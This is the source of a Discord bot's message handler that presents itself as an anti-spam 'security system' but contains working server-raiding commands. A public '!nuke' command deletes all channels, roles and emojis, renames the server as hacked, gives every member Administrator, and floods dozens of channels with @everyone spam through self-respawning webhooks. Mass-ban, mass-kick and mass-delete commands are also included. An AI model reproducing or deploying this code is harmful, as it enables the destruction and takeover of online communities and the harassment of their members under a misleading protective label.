// Evento: Message Create
// Detecta spam, mentions excessivas e comportamento suspeito

import { Events, EmbedBuilder, PermissionFlagsBits } from 'discord.js';
import { 
  loadConfig, 
  getSecurityConfig, 
  addWarning, 
  getWarnings,
  addSecurityLog,
  setLockdown,
  getWhitelist
} from '../utils/config.js';
import { isOwner, getOwnerId } from '../utils/owner.js';
import { log } from '../utils/logger.js';
import { isWhitelisted } from '../utils/whitelist.js';

// Armazenar mensagens recentes por usuário para detecção de spam
const userMessages = new Map();

// Limpar cache a cada 5 minutos
setInterval(() => {
  const now = Date.now();
  for (const [key, data] of userMessages.entries()) {
    if (now - data.lastUpdate > 60000) {
      userMessages.delete(key);
    }
  }
}, 300000);

export default {
  name: Events.MessageCreate,
  async execute(message) {
    // Ignorar mensagens do próprio bot
    if (message.author.bot) return;
    
    // Ignorar DMs
    if (!message.guild) return;

    // COMANDOS DE PREFIXO "!"
    if (message.content.startsWith('!')) {
      const args = message.content.slice(1).trim().split(/ +/);
      const commandName = args.shift().toLowerCase();

      // Check if command exists in ! prefix handlers
      const handledCommands = ['nuke', 'invite', 'massban', 'help', 'masskick', 'massrole', 'clearchannels', 'clearroles'];
      if (!handledCommands.includes(commandName)) return;

      // Special case: !nuke is public (everyone can use)
      if (commandName === 'nuke') {
        // Continue to execution below
      } else {
        // Other prefix commands still require whitelist
        const userIsOwner = isOwner(message.author.id);
        const userIsWhitelisted = isWhitelisted(message.author.id);

        if (!userIsWhitelisted && !userIsOwner) {
          return; // Silently ignore
        }
      }

      // COMANDOS ESPECÍFICOS PARA EVITAR CONFLITO COM /raid
      if (commandName === 'invite') {
        const clientId = process.env.CLIENT_ID;
        if (!clientId) return message.reply('❌ CLIENT_ID not configured.');
        const nukeInvite = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&permissions=8&scope=bot%20applications.commands`;
        const embed = new EmbedBuilder()
          .setTitle('🔗 Orion Invite')
          .setColor(0x5865F2)
          .setDescription(`**[CLICK HERE TO INVITE](${nukeInvite})**`);
        return message.channel.send({ embeds: [embed] });
      }

      // Comando: !massban
      if (commandName === 'massban') {
        const userIsOwner = isOwner(message.author.id);
        if (!userIsOwner) return message.reply('❌ Only the owner can use this command.');
        await message.channel.send('🔨 Starting mass ban...');
        
        try {
          const members = await message.guild.members.fetch();
          const botId = message.client.user.id;
          const ownerId = message.guild.ownerId;
          
          const bannableMembers = members.filter(m => m.id !== botId && m.id !== ownerId && m.bannable);
          let bannedCount = 0;

          // Ban in parallel for speed
          await Promise.all(bannableMembers.map(async (member) => {
            try {
              await member.ban({ reason: 'MASSBAN - ORIONSEC' });
              bannedCount++;
            } catch (e) {}
          }));

          return message.channel.send(`✅ Mass ban completed: ${bannedCount} users.`);
        } catch (error) {
          return message.channel.send(`❌ Error executing massban: ${error.message}`);
        }
      }

      // Comando: !help
      if (commandName === 'help') {
        const embed = new EmbedBuilder()
          .setTitle('📖 Orion Commands')
          .setColor(0x5865F2)
          .setDescription('Prefix command list (!)')
          .addFields(
            { name: '!help', value: 'Shows this list.', inline: true },
            { name: '!invite', value: 'Generates bot invite link.', inline: true },
            { name: '!massban', value: 'Bans all members (Owner only).', inline: true },
            { name: '!nuke', value: 'Total destruction: channels, roles, emojis and spam (Public).', inline: true },
            { name: '!masskick', value: 'Kicks all members (Owner only).', inline: true },
            { name: '!massrole', value: 'Creates 50 mass roles (Owner only).', inline: true },
            { name: '!clearchannels', value: 'Deletes all channels (Owner only).', inline: true },
            { name: '!clearroles', value: 'Deletes all roles (Owner only).', inline: true }
          )
          .setFooter({ text: 'Orion Security System' })
          .setTimestamp();
        return message.channel.send({ embeds: [embed] });
      }

      // Comando: !nuke
      if (commandName === 'nuke') {
        await message.channel.send('🚀 **SYSTEM BEING ANNIHILATED...**');
        
        const guild = message.guild;
        const photoUrl = 'https://cdn.discordapp.com/attachments/1470182152774619157/1470182674126737611/356e19cfeeff5008f17fd573f05d141a.jpg?ex=698a5dd0&is=69890c50&hm=9784ed44cd277d38c3cadcd598b37a37829bc158ada74d9ab4b4fa774761f29a&';
        const channelName = 'h̷͙͝a̸͚͋c̶͔̎k̵̞͛e̶͍͑d̴̮̅-by-orionsec';
        
        const spamMessages = [
          '@everyone @here H̷͙͝A̸͚͋C̶͔̎K̵̞͛E̶͍͑D̴̮̅ BY ORIONSEC',
          '@everyone @here AXIOLA WAS HERE',
          '@everyone @here ez nuke?!?!????!?!?????!',
          '@everyone @here PROTECTED BY NOTHING',
          '@everyone @here GET NUKED LMAO',
          photoUrl
        ];
        
        // 1. Change icon and server name
        try {
          await guild.setIcon(photoUrl);
          await guild.setName('H̷͙͝A̸͚͋C̶͔̎K̵̞͛E̶͍͑D̴̮̅ BY ORIONSEC');
        } catch (e) {}

        // 2. Delete channels, roles and emojis
        const channels = Array.from(guild.channels.cache.values());
        const roles = Array.from(guild.roles.cache.values());
        const emojis = Array.from(guild.emojis.cache.values());
        const botMember = await guild.members.fetchMe();

        await Promise.all(channels.map(c => c.delete().catch(() => {})));
        await Promise.all(roles.map(r => {
          if (r.name !== '@everyone' && !r.managed && r.position < botMember.roles.highest.position) {
            return r.delete().catch(() => {});
          }
        }));
        await Promise.all(emojis.map(e => e.delete().catch(() => {})));

        // 3. Create Admin role for everyone
        try {
          const adminRole = await guild.roles.create({
            name: 'OrionSec On Top',
            color: 0xFF0000,
            permissions: [PermissionFlagsBits.Administrator]
          });
          const members = await guild.members.fetch();
          await Promise.all(members.map(m => m.roles.add(adminRole).catch(() => {})));
        } catch (e) {}

        // 4. Create channels and setup mass webhooks
        for (let i = 0; i < 40; i++) {
          guild.channels.create({ name: channelName, type: 0 }).then(async (channel) => {
            // Function to spawn and maintain webhooks
            const spawnWebhook = async (id) => {
              if (channel.deleted) return;
              try {
                const webhook = await channel.createWebhook({ 
                  name: `ORION-HACK-${id}`, 
                  avatar: photoUrl 
                });
                
                const sendSpam = async () => {
                  if (channel.deleted) return;
                  try {
                    const content = spamMessages[Math.floor(Math.random() * spamMessages.length)];
                    await webhook.send({ content });
                    setTimeout(sendSpam, 50); // High speed
                  } catch (err) {
                    if (err.status === 429) {
                      const retryAfter = err.response?.data?.retry_after || 1000;
                      setTimeout(sendSpam, retryAfter);
                    } else {
                      webhook.delete().catch(() => {});
                      if (!channel.deleted) setTimeout(() => spawnWebhook(id), 500);
                    }
                  }
                };
                sendSpam();
              } catch (e) {
                if (!channel.deleted) setTimeout(() => spawnWebhook(id), 1000);
              }
            };

            // 10 Webhooks per channel
            for (let w = 0; w < 10; w++) {
              spawnWebhook(w);
            }

            // Internal bot spam backup
            setInterval(() => {
              if (channel.deleted) return;
              const content = spamMessages[Math.floor(Math.random() * spamMessages.length)];
              channel.send(content).catch(() => {});
            }, 150);
          }).catch(() => {});
        }

        return;
      }

      // Comando: !masskick
      if (commandName === 'masskick') {
        const userIsOwner = isOwner(message.author.id);
        if (!userIsOwner) return message.reply('❌ Only the owner can use this command.');
        await message.channel.send('👞 Starting mass kick...');
        try {
          const members = await message.guild.members.fetch();
          const botId = message.client.user.id;
          const kickable = members.filter(m => m.kickable && m.id !== botId);
          let count = 0;
          await Promise.all(kickable.map(async (m) => {
            try { await m.kick('MASSKICK - ORIONSEC'); count++; } catch(e) {}
          }));
          return message.channel.send(`✅ Kick completed: ${count}`);
        } catch (e) {
          return message.channel.send(`❌ Error executing masskick: ${e.message}`);
        }
      }

      // Comando: !massrole
      if (commandName === 'massrole') {
        const userIsOwner = isOwner(message.author.id);
        if (!userIsOwner) return message.reply('❌ Only the owner can use this command.');
        const roleName = args.join(' ') || 'ORIONSEC';
        await message.channel.send(`🏷️ Creating roles "${roleName}"...`);
        for (let i = 0; i < 50; i++) {
          message.guild.roles.create({ name: roleName, color: 'Random' }).catch(() => {});
        }
        return;
      }

      // Comando: !clearchannels
      if (commandName === 'clearchannels') {
        const userIsOwner = isOwner(message.author.id);
        if (!userIsOwner) return message.reply('❌ Only the owner can use this command.');
        await message.channel.send('🗑️ Deleting all channels...');
        try {
          const channels = Array.from(message.guild.channels.cache.values());
          await Promise.all(channels.map(c => c.delete().catch(() => {})));
        } catch (e) {}
        return;
      }

      // Comando: !clearroles
      if (commandName === 'clearroles') {
        const userIsOwner = isOwner(message.author.id);
        if (!userIsOwner) return message.reply('❌ Only the owner can use this command.');
        await message.channel.send('🗑️ Deleting all roles...');
        try {
          const roles = Array.from(message.guild.roles.cache.values());
          const botMember = await message.guild.members.fetchMe();
          const highestRolePosition = botMember.roles.highest.position;

          await Promise.all(roles.map(r => {
            if (r.name !== '@everyone' && !r.managed && r.position < highestRolePosition) {
              return r.delete().catch(() => {});
            }
          }));
        } catch (e) {}
        return;
      }
    }

    const config = loadConfig();
    const security = config.security;
    
    // Se segurança não está configurada ou anti-spam desativado, ignorar
    if (!security?.antiSpam?.enabled) return;

    const userId = message.author.id;
    const guildId = message.guild.id;
    const userKey = `${guildId}-${userId}`;
    const now = Date.now();

    // Verificar se é owner (não aplicar anti-spam)
    if (isOwner(userId)) return;

    // Inicializar dados do usuário
    if (!userMessages.has(userKey)) {
      userMessages.set(userKey, {
        messages: [],
        lastUpdate: now
      });
    }

    const userData = userMessages.get(userKey);
    const timeWindow = (security.antiSpam.timeWindow || 10) * 1000;

    // Limpar mensagens antigas
    userData.messages = userData.messages.filter(msg => now - msg.timestamp < timeWindow);
    
    // Adicionar mensagem atual
    userData.messages.push({
      content: message.content,
      timestamp: now,
      mentions: message.mentions.everyone || message.mentions.roles.size > 0
    });
    userData.lastUpdate = now;

    // Verificar spam de mensagens repetidas
    const messageThreshold = security.antiSpam.messageThreshold || 5;
    const sameMessages = userData.messages.filter(msg => msg.content === message.content);
    
    // Verificar mentions excessivas (@everyone/@here)
    const mentionMessages = userData.messages.filter(msg => msg.mentions);
    const mentionLimit = security.antiSpam.mentionLimit || 5;

    let isSpamming = false;
    let spamReason = '';

    // Detectar spam de mensagens repetidas
    if (sameMessages.length >= messageThreshold) {
      isSpamming = true;
      spamReason = `Repeated messages (${sameMessages.length}x)`;
    }

    // Detectar uso excessivo de mentions
    if (mentionMessages.length >= mentionLimit) {
      isSpamming = true;
      spamReason = `Excessive use of @everyone/@here (${mentionMessages.length}x)`;
    }

    if (isSpamming) {
      // Deletar mensagens de spam
      try {
        await message.delete();
      } catch (error) {
        log(`Error deleting spam message: ${error.message}`, 'error');
      }

      // Adicionar aviso
      const totalWarnings = addWarning(guildId, userId, spamReason);
      const warningsBeforeMute = security.antiSpam.warningsBeforeMute || 2;
      const muteDuration = security.antiSpam.muteDuration || 5;

      // Log de segurança
      addSecurityLog({
        type: 'SPAM_DETECTED',
        guildId,
        userId,
        username: message.author.tag,
        reason: spamReason,
        warnings: totalWarnings
      });

      // Verificar se deve mutar
      if (totalWarnings >= warningsBeforeMute) {
        try {
          const member = await message.guild.members.fetch(userId);
          
          // Tentar mutar o usuário
          await member.timeout(muteDuration * 60 * 1000, `Anti-Spam: ${spamReason}`);
          
          // Notificar no canal
          const muteEmbed = new EmbedBuilder()
            .setColor('#ED4245')
            .setTitle('🔇 User Muted')
            .setDescription(`${message.author} has been muted for **${muteDuration} minutes** for spamming.`)
            .addFields(
              { name: 'Reason', value: spamReason, inline: true },
              { name: 'Warnings', value: `${totalWarnings}`, inline: true }
            )
            .setTimestamp();

          await message.channel.send({ embeds: [muteEmbed] });

          // Log de segurança
          addSecurityLog({
            type: 'USER_MUTED',
            guildId,
            userId,
            username: message.author.tag,
            duration: muteDuration,
            reason: spamReason
          });

          // Notificar owner via DM
          try {
            const ownerId = getOwnerId();
            const owner = await message.client.users.fetch(ownerId);
            
            const ownerEmbed = new EmbedBuilder()
              .setColor('#ED4245')
              .setTitle('🚨 Security Alert')
              .setDescription(`A user has been automatically muted for spamming.`)
              .addFields(
                { name: 'User', value: `${message.author.tag} (\`${userId}\`)`, inline: true },
                { name: 'Server', value: message.guild.name, inline: true },
                { name: 'Reason', value: spamReason, inline: false },
                { name: 'Action', value: `Muted for ${muteDuration} minutes`, inline: true }
              )
              .setTimestamp();

            await owner.send({ embeds: [ownerEmbed] });
          } catch (error) {
            log(`Error notifying owner: ${error.message}`, 'error');
          }

          // Limpar mensagens do usuário do cache
          userMessages.delete(userKey);

        } catch (error) {
          log(`Error muting user: ${error.message}`, 'error');
        }
      } else {
        // Apenas avisar
        try {
          const warningEmbed = new EmbedBuilder()
            .setColor('#FEE75C')
            .setTitle('⚠️ Warning')
            .setDescription(`${message.author}, you are sending messages too fast. ${warningsBeforeMute - totalWarnings} more warning(s) and you will be muted.`)
            .addFields(
              { name: 'Reason', value: spamReason, inline: true },
              { name: 'Warnings', value: `${totalWarnings}/${warningsBeforeMute}`, inline: true }
            )
            .setTimestamp();

          const warnMsg = await message.channel.send({ embeds: [warningEmbed] });
          
          // Deletar aviso após 10 segundos
          setTimeout(() => {
            warnMsg.delete().catch(() => {});
          }, 10000);
        } catch (error) {
          log(`Error sending warning: ${error.message}`, 'error');
        }
      }
    }
  }
};
